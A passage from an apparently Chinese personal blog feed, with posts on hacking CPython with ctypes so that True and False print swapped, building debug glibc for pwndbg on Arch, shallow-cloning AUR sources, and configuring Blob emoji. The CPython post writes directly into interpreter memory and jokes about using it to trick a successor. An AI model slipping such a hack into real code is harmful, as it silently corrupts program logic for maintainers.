这玩意儿真实的(C)类型是什么? </p><p>在 <code>Python/ceval:4686</code> 行可以找到 <code>cmp_outcome</code> 的定义, 结尾是这么写的.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    v = res ? Py_True : Py_False;</span><br><span class="line">    Py_INCREF(v);</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说 (上一个)res 的值是 <code>Py_True</code> 或 <code>Py_False</code>, 而它俩的定义在 <code>Include/boolobject.h:21</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Py_False and Py_True are the only two bools in existence.</span></span><br><span class="line"><span class="comment">Don't forget to apply Py_INCREF() when returning either!!! */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don't use these directly */</span></span><br><span class="line">PyAPI_DATA(struct _longobject) _Py_FalseStruct, _Py_TrueStruct;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use these macros */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Py_False ((PyObject *) &amp;_Py_FalseStruct)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Py_True ((PyObject *) &amp;_Py_TrueStruct)</span></span><br></pre></td></tr></table></figure><p>可以发现,  <code>Py_False</code> 这玩意儿只是个宏, 代表的是 <code>_Py_FalseStruct</code> 的地址.<br>显然, 即使我们用 <code>_Py_TrueStruct</code> 的内容覆盖 <code>_Py_FalseStruct</code> 的内容, <code>Py_True</code> 和 <code>Py_False</code> 的值也不会受影响.</p><p>而且 <code>is</code> 操作符的实现非常简单粗暴, 也不大可能对 <code>is</code> 操作符动什么手脚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PyCmp_IS:</span><br><span class="line">    res = (v == w);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>就这么结束了吗? 不, 上次在 python repl 环境中无法重载内置类型的方法, 那直接写内存有没有可能重载呢?</p><h2 id="3-bool-repr"><a href="#3-bool-repr" class="headerlink" title="3. bool_repr"></a>3. <code>bool_repr</code></h2><p>在 <code>Python/boolobject.c:12</code> 可以看到 <code>bool_repr</code> 的实现, </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> PyObject *false_str = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> PyObject *true_str = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> PyObject *</span><br><span class="line">bool_repr(PyObject *self)</span><br><span class="line">&#123;</span><br><span class="line">    PyObject *s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self == Py_True)</span><br><span class="line">        s = true_str ? true_str :</span><br><span class="line">            (true_str = PyUnicode_InternFromString(<span class="string">"True"</span>));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        s = false_str ? false_str :</span><br><span class="line">            (false_str = PyUnicode_InternFromString(<span class="string">"False"</span>));</span><br><span class="line">    Py_XINCREF(s);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一反应: 能不能改掉这个函数, 比如把这个 <code>==</code> 改成 <code>!=</code> 啥的? --不可能的 .text 段的东西哪儿能说改就改.</p><p>那有没有可能 hook 这个函数呢? <code>read -s ./python</code> 看一下, 真的有 <code>bool_repr</code> 这个函数, 可以 hook 的样子! --想多了这是 Debug 版才保留了这些符号...</p><p>有没有其他办法? 注意到这个函数中为了提高速度缓存了 <code>true_str</code> 和 <code>false_str</code>, 那直接 <code>false_str=true_str</code> 不就行了吗? 在 gdb 中执行 <code>p false_str=true_str</code> 然后继续执行, 可以在命令行里看到后面的输出都变成了 <code>True True</code>!</p><p>这个方法真是绝妙啊, 唯一的问题就是在 Python 中没有办法获得 <code>false_str</code> 和 <code>true_str</code> 的地址, 修改也就无从谈起了...</p><h2 id="4-PyUnicode-Type"><a href="#4-PyUnicode-Type" class="headerlink" title="4. PyUnicode_Type"></a>4. <code>PyUnicode_Type</code></h2><p>不要慌, 还没走到绝路.</p><p><code>false_str</code> 的真实类型是什么?  这玩意儿一定有某个地方存着 &quot;False&quot; 这个字符串吧, 而且这个对象是动态生成的, 我肯定有权限修改.</p><p><code>p *false_str</code> 看一下, 发现是 PyUnicode_Type</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">41</span> = &#123;</span><br><span class="line">  _ob_next = <span class="number">0x6b2ba0</span> &lt;_Py_FalseStruct&gt;, </span><br><span class="line">  _ob_prev = <span class="number">0x6b2b60</span> &lt;_Py_TrueStruct&gt;, </span><br><span class="line">  ob_refcnt = <span class="number">6</span>, </span><br><span class="line">  ob_type = <span class="number">0x6cf020</span> &lt;PyUnicode_Type&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>Objects/unicodeobject.c:12538</code> 可以找到 <code>unicode_repr</code> 函数, 部分内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">repr = PyUnicode_New(osize, max);</span><br><span class="line"><span class="keyword">if</span> (repr == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">okind = PyUnicode_KIND(repr);</span><br><span class="line">odata = PyUnicode_DATA(repr);</span><br><span class="line"></span><br><span class="line">PyUnicode_WRITE(okind, odata, <span class="number">0</span>, quote);</span><br><span class="line">PyUnicode_WRITE(okind, odata, osize<span class="number">-1</span>, quote);</span><br></pre></td></tr></table></figure><p>repr 为返回值, 可以看出 repr 由 <code>PyUnicode_New</code> 初始化, 通过 <code>Py_Unicode_DATA</code> 获取其中的 data 部分, 目测为字符串存放的位置</p><p>先到 <code>Objects/unicodeobject.c:1233</code> 看看 <code>PyUnicode_New</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unicode = (PyCompactUnicodeObject *)obj;</span><br><span class="line"><span class="keyword">if</span> (is_ascii)</span><br><span class="line">    data = ((PyASCIIObject*)obj) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    data = unicode + <span class="number">1</span>;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (is_ascii) &#123;</span><br><span class="line">    ((<span class="keyword">char</span>*)data)[size] = <span class="number">0</span>;</span><br><span class="line">    _PyUnicode_WSTR(unicode) = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>! 将 obj 转为 <code>PyASCIIObject*</code> 再 +1 再转为 <code>char*</code>, 似乎就是字符串存放的真正地址了?</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (<span class="keyword">char</span> *)((PyASCIIObject *)false_str + <span class="number">1</span>)</span><br><span class="line">$<span class="number">47</span> = <span class="number">0x7fd80d9afbe0</span> <span class="string">"True"</span> <span class="comment">//注意因为先前已经 false_str=true_str 了所以这里是 True</span></span><br></pre></td></tr></table></figure><p>wow, 没错! 这真是相当 excited.</p><p>又因为<code>sizeof(PyASCIIObject) == 64</code>, 那么 <code>false_str + 64</code> 也就是 <code>id(&#39;False&#39;) + 64</code> 就是字符串的位置了.</p><p>写成 Python 代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">print(<span class="keyword">True</span>, <span class="keyword">False</span>) <span class="comment"># 确保已经生成了对应的字符串</span></span><br><span class="line">false_str_addr = id(<span class="string">'False'</span>) + <span class="number">64</span> <span class="comment"># Debug 版</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> zip(range(<span class="number">5</span>), <span class="string">b'True\x00'</span>):</span><br><span class="line">    ctypes.c_char.from_address(false_str_addr + i).value = c <span class="comment"># 直接 strcpy 出错了 不造为啥</span></span><br></pre></td></tr></table></figure><p>不过有一点比较迷, 就是系统自带的 Python, 偏移量并不是64, 而是 48. 难道是gcc的迷之优化?</p><h1 id="最终代码-互换-True-False"><a href="#最终代码-互换-True-False" class="headerlink" title="最终代码: 互换 True False"></a>最终代码: 互换 True False</h1><p>注意到 <code>PyASCIIObject</code> 有个 <code>length</code> 指定了字符串长度, 修改的时候最好一起改掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(PyASCIIObject *)true_str</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  ob_base = &#123;</span><br><span class="line">    _ob_next = <span class="number">0x6b2ba0</span> &lt;_Py_FalseStruct&gt;, </span><br><span class="line">    _ob_prev = <span class="number">0x6b2b60</span> &lt;_Py_TrueStruct&gt;, </span><br><span class="line">    ob_refcnt = <span class="number">6</span>, </span><br><span class="line">    ob_type = <span class="number">0x6cf020</span> &lt;PyUnicode_Type&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  length = <span class="number">4</span>, </span><br><span class="line">  hash = <span class="number">-8576775955766428395</span>, </span><br><span class="line">  state = &#123;</span><br><span class="line">    interned = <span class="number">1</span>, </span><br><span class="line">    kind = <span class="number">1</span>, </span><br><span class="line">    compact = <span class="number">1</span>, </span><br><span class="line">    ascii = <span class="number">1</span>, </span><br><span class="line">    ready = <span class="number">1</span></span><br><span class="line">  &#125;, </span><br><span class="line">  wstr = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">print(<span class="keyword">True</span>, <span class="keyword">False</span>) <span class="comment"># 确保已经生成了对应的字符串</span></span><br><span class="line">false_addr = id(<span class="string">'False'</span>)</span><br><span class="line">true_addr = id(<span class="string">'True'</span>)</span><br><span class="line"></span><br><span class="line">read_char = <span class="keyword">lambda</span> n: ctypes.c_char.from_address(n)</span><br><span class="line"></span><br><span class="line">tmp = <span class="string">b''</span>.join([read_char(false_addr + i).value <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>)])</span><br><span class="line">str_offset = tmp.index(<span class="string">b'False'</span>) <span class="comment"># 定位字符串所在位置</span></span><br><span class="line">length_offset = tmp.index(<span class="string">b'\x05'</span>) <span class="comment"># 定位长度所在位置(这个有点不放心...)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改字符串</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> zip(range(<span class="number">5</span>), <span class="string">b'True\x00'</span>):</span><br><span class="line">    read_char(false_addr + str_offset + i).value = c</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> zip(range(<span class="number">6</span>), <span class="string">b'False\x00'</span>):</span><br><span class="line">    read_char(true_addr + str_offset + i).value = c</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 修改长度</span></span><br><span class="line">read_char(false_addr + length_offset).value = <span class="string">b'\x04'</span></span><br><span class="line">read_char(true_addr + length_offset).value = <span class="string">b'\x05'</span></span><br></pre></td></tr></table></figure><p>效果:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">2</span>]: <span class="keyword">print</span> <span class="keyword">True</span>, <span class="keyword">False</span></span><br><span class="line">------&gt; print(True, False)</span><br><span class="line"><span class="keyword">False</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="number">1</span> == <span class="number">2</span></span><br><span class="line">Out[<span class="number">3</span>]: <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: <span class="string">'God'</span> <span class="keyword">is</span> <span class="string">'girl'</span></span><br><span class="line">Out[<span class="number">5</span>]: <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="string">'cat'</span> <span class="keyword">is</span> <span class="string">'dog'</span></span><br><span class="line">Out[<span class="number">6</span>]: <span class="keyword">True</span></span><br></pre></td></tr></table></figure><p>正确用法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">2</span>]: <span class="string">'Emacs'</span> <span class="keyword">is</span> <span class="string">'the best editor'</span></span><br><span class="line">Out[<span class="number">2</span>]: <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: 我给你一次重新组织语言的机会</span><br><span class="line">Out[<span class="number">3</span>]: ...</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="string">'Emacs'</span> <span class="keyword">is</span> <span class="string">'the best editor'</span></span><br><span class="line">Out[<span class="number">4</span>]: <span class="keyword">True</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这是一篇闲蛋疼的文章, 讲述了闲蛋疼的我是如何&lt;del&gt;历经千辛万苦终于&lt;/del&gt;在 Python 中让 &lt;code&gt;&amp;#39;a&amp;#39; is &amp;#39;b&amp;#39;&lt;/code&gt; 得到 &lt;code&gt;True&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;del&gt;(虽然这件事情毫无意义)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;(不过拿来坑下一任或许是个好主意呢)&lt;/del&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="egg_pain" scheme="https://www.aloxaf.com/categories/egg-pain/"/>
    
    
      <category term="python" scheme="https://www.aloxaf.com/tags/python/"/>
    
      <category term="egg_pain" scheme="https://www.aloxaf.com/tags/egg-pain/"/>
    
  </entry>
  
  <entry>
    <title>Arch Linux 下使用 pwndbg</title>
    <link href="https://www.aloxaf.com/2018/10/arch_pwndbg/"/>
    <id>https://www.aloxaf.com/2018/10/arch_pwndbg/</id>
    <published>2018-10-19T05:47:04.000Z</published>
    <updated>2018-11-17T12:54:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>pwndbg 的安装: <code>pacman -S pwndbg</code> 然后添加 <code>source /usr/share/pwndbg/gdbinit.py</code> 到 <code>~/.gdbinit</code></p><p>然而要在 Arch Linux 下愉快地使用 pwndbg, 还要解决以下问题:</p><ul><li><a href="https://github.com/pwndbg/pwndbg/issues/340" target="_blank" rel="noopener">Arch Support - Roadmap</a> 搁了快一年的问题, 主要是 Arch 下没有 libc6-dbg 这种包, 要调试符号只能自己编译...</li><li><a href="https://github.com/pwndbg/pwndbg/issues/523#issuecomment-425673020" target="_blank" rel="noopener">Python exception under gdb-8.2-2</a> 上游 gdb 的问题, 8.3 应该会修复, 不过可以按链接所示的方法临时 patch 一下</li></ul><p>这里解决第一个问题, 利用棒棒的 ABS (Arch Build System)</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">svn checkout --depth=empty svn://svn.archlinux.org/packages</span><br><span class="line"><span class="built_in">cd</span> packages</span><br><span class="line">svn update glibc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Build glibc (Fix #340)</span></span><br><span class="line"><span class="built_in">cd</span> glibc/repos/core-x86_64</span><br><span class="line"><span class="built_in">echo</span> en_US.UTF-8 UTF-8 &gt;&gt;locale.gen.txt</span><br><span class="line"><span class="comment">## For Chinese users</span></span><br><span class="line"><span class="comment">## echo zh_CN.UTF-8 UTF-8 &gt;&gt;locale.gen.txt</span></span><br><span class="line"><span class="comment">## sed -i 's#sourceware.org/git/glibc.git#gitee.com/Aloxaf/glibc.git#' PKGBUILD</span></span><br><span class="line"><span class="comment"># generate detached debugging symbols</span></span><br><span class="line">sed -i <span class="string">'s#!strip#debug#'</span> PKGBUILD</span><br><span class="line"><span class="comment"># skip check</span></span><br><span class="line">makepkg --skipchecksums --nocheck</span><br><span class="line">sudo pacman -U *.pkg.tar.xz</span><br></pre></td></tr></table></figure><p>缺点是每次升级 glibc 的时候要自己重新编译一遍......</p><p>(听说 Debug Symbols 的支持已经在进行中了?)</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>今天学长按照这个试了一下, 编译了一个下午都没编译完(然后怒转 mint ). 然后我才想起来第一次我也遇到了这个问题: 其实编译早就完成了, 只是一直在跑测试......(大概是因为 glibc 非常重要, 所以测试很多....) (不过测试虽然慢但我当时似乎也跑完了) (可能是因为我改了 <code>BUILDDIR</code> ?)</p><p>要取消测试可以简单地给 <code>makepkg</code> 添加 <code>--nocheck</code> 参数</p><p>或者一劳永逸(暴力)的办法: 在 <code>/etc/makepkg.conf</code> 中将 <code>BUILDENV</code> 中的 <code>check</code> 改为 <code>!check</code> (因为我被坑了一次后就加上了, 然后就忘了这个坑...)</p><p>P.S. 顺便也可以根据这篇文章 <a href="https://wiki.archlinux.org/index.php/Makepkg_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E7%BC%96%E8%AF%91%E7%BB%93%E6%9E%9C%E4%BC%98%E5%8C%96" target="_blank" rel="noopener">Makepkg_(简体中文)#编译结果优化</a> 优化一下其他参数, 主要是 <code>BUILDDIR</code> ,<code>CFLAGS</code>, <code>CXXFLAGS</code> 和 <code>MAKEFLAGS</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwndbg 的安装: &lt;code&gt;pacman -S pwndbg&lt;/code&gt; 然后添加 &lt;code&gt;source /usr/share/pwndbg/gdbinit.py&lt;/code&gt; 到 &lt;code&gt;~/.gdbinit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然而要在 Arch Linux 下愉快地使用 pwndbg, 还要解决以下问题:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/pwndbg/pwndbg/issues/340&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Arch Support - Roadmap&lt;/a&gt; 搁了快一年的问题, 主要是 Arch 下没有 libc6-dbg 这种包, 要调试符号只能自己编译...&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/pwndbg/pwndbg/issues/523#issuecomment-425673020&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Python exception under gdb-8.2-2&lt;/a&gt; 上游 gdb 的问题, 8.3 应该会修复, 不过可以按链接所示的方法临时 patch 一下&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这里解决第一个问题, 利用棒棒的 ABS (Arch Build System)&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>加速 AUR 软件安装速度</title>
    <link href="https://www.aloxaf.com/2018/10/arch_git/"/>
    <id>https://www.aloxaf.com/2018/10/arch_git/</id>
    <published>2018-10-18T08:15:30.000Z</published>
    <updated>2018-10-18T08:15:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>AUR 里的构建脚本常常需要从 github 拉取源代码,<br>然而没有加 <code>--depth 1</code> 的 <code>git clone</code> 把大量流量花在了下载对于构建毫无用处的提交记录等东西上面. </p><p>尤其是安装主题这种东西的时候, clone 下来几百 MB, 结果构建完得到一个几 MB 的包...</p><a id="more"></a><p>暴力的解决方案:</p><p>打开 <code>/usr/share/makepkg/source/git.sh</code>, 其中有一段这样的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git <span class="built_in">clone</span> --mirror <span class="string">"<span class="variable">$url</span>"</span> <span class="string">"<span class="variable">$dir</span>"</span>; <span class="keyword">then</span></span><br><span class="line">error <span class="string">"<span class="variable">$(gettext "Failure while downloading %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line">plain <span class="string">"<span class="variable">$(gettext "Aborting...")</span>"</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>改成这样, 也就是在外面又加了一层 if. 不直接改在原来的基础上加是因为有些网站不支持 <code>--depth</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git <span class="built_in">clone</span> --depth=1 --mirror <span class="string">"<span class="variable">$url</span>"</span> <span class="string">"<span class="variable">$dir</span>"</span>; <span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> ! git <span class="built_in">clone</span> --mirror <span class="string">"<span class="variable">$url</span>"</span> <span class="string">"<span class="variable">$dir</span>"</span>; <span class="keyword">then</span></span><br><span class="line">error <span class="string">"<span class="variable">$(gettext "Failure while downloading %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line">plain <span class="string">"<span class="variable">$(gettext "Aborting...")</span>"</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>同理, 还有如下代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git fetch --all -p; <span class="keyword">then</span></span><br><span class="line"><span class="comment"># only warn on failure to allow offline builds</span></span><br><span class="line">warning <span class="string">"<span class="variable">$(gettext "Failure while updating %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>....改成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! git fetch --depth=1 -p; <span class="keyword">then</span></span><br><span class="line"><span class="keyword">if</span> ! git fetch --all -p; <span class="keyword">then</span></span><br><span class="line"><span class="comment"># only warn on failure to allow offline builds</span></span><br><span class="line">warning <span class="string">"<span class="variable">$(gettext "Failure while updating %s %s repo")</span>"</span> <span class="string">"<span class="variable">$&#123;repo&#125;</span>"</span> <span class="string">"git"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>这样速度就令人满意多了, 对于大部分构建脚本应该都没问题, </p><p><del>遇到问题再改吧 (</del></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;AUR 里的构建脚本常常需要从 github 拉取源代码,&lt;br&gt;然而没有加 &lt;code&gt;--depth 1&lt;/code&gt; 的 &lt;code&gt;git clone&lt;/code&gt; 把大量流量花在了下载对于构建毫无用处的提交记录等东西上面. &lt;/p&gt;
&lt;p&gt;尤其是安装主题这种东西的时候, clone 下来几百 MB, 结果构建完得到一个几 MB 的包...&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>在 Linux 下使用 Blob Emoji</title>
    <link href="https://www.aloxaf.com/2018/10/linux_emoji/"/>
    <id>https://www.aloxaf.com/2018/10/linux_emoji/</id>
    <published>2018-10-10T11:00:45.000Z</published>
    <updated>2018-10-10T11:00:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>默认emoji太丑, 没有颜色, 看着浑身难受.</p><p>还是喜欢果冻人...</p><a id="more"></a><p>通过以下命令安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pikaur -S noto-fonts-emoji-blob</span><br></pre></td></tr></table></figure><p>然后往 <code>~/.config/fontconfig/conf.d/70-emojione-color.conf</code> 写入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE fontconfig SYSTEM "fonts.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">fontconfig</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>sans-serif<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span 